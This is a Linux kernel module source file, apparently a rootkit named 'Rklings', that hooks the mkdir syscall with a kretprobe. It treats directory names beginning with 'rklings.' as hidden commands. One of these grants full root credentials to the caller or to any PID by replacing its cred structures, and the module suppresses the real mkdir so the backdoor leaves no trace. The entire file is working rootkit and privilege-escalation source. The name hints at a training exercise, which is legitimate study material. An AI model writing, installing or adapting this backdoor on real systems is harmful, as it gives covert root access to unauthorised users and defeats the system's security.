// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static unsigned int escalation_count;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = find_task_by_vpid(pid);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_cmd_ping(const char *arg)
{
	return 0;
}

static int rk_cmd_status(const char *arg)
{
	pr_info("rklings: alive, escalations=%u\n", escalation_count);
	return 0;
}

static int rk_cmd_escalate(const char *arg)
{
	int pid;

	if (!arg)
		return rk_escalate();

	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;

	return rk_escalate_pid(pid);
}

static int rk_dispatch(const char *name)
{
	const char *suffix;
	const char *dot;
	const char *arg;
	int cmd_len;

	suffix = name + RK_PREFIX_LEN;

	dot = strchr(suffix, '.');
	if (dot) {
		cmd_len = dot - suffix;
		arg = dot + 1;
	} else {
		cmd_len = strlen(suffix);
		arg = NULL;
	}

	if (cmd_len == 1 && strncmp(suffix, "e", 1) == 0)
		return rk_cmd_escalate(arg);
	if (cmd_len == 4 && strncmp(suffix, "ping", 4) == 0)
		return rk_cmd_ping(arg);
	if (cmd_len == 6 && strncmp(suffix, "status", 6) == 0)
		return rk_cmd_status(arg);

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_entry(struct kretprobe_instance *inst,
			  struct pt_regs *regs)
{
	struct rk_mkdir_data *data;
	struct pt_regs *uregs;
	const char __user *pathname;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;

	pathname = (const char __user *)uregs->di;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler  = rk_mkdir_entry,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

static int __init rk_init(void)
{
	return register_kretprobe(&rk_mkdir_probe);
}

static void __exit rk_exit(void)
{
	unregister_kretprobe(&rk_mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings command dispatcher");
